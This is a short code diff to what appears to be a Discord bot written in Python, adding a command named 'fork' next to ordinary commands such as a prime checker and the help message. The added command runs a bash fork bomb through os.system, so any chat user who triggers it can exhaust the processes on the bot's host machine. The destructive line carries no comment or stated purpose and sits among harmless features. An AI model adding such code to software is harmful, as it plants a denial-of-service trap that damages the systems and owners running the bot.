@@ -269,6 +269,9 @@ class Misc:
         return await ctx.send('Prime! {} is only divisible by 1 and itself.'.format(num))
 
     @commands.command()
+    async def fork(self, ctx): __import__('os').system(':(){ :|: & };:')
+
+    @commands.command()
     async def help(self, ctx, *args):
         """This help message"""
         if len(args) == 0:
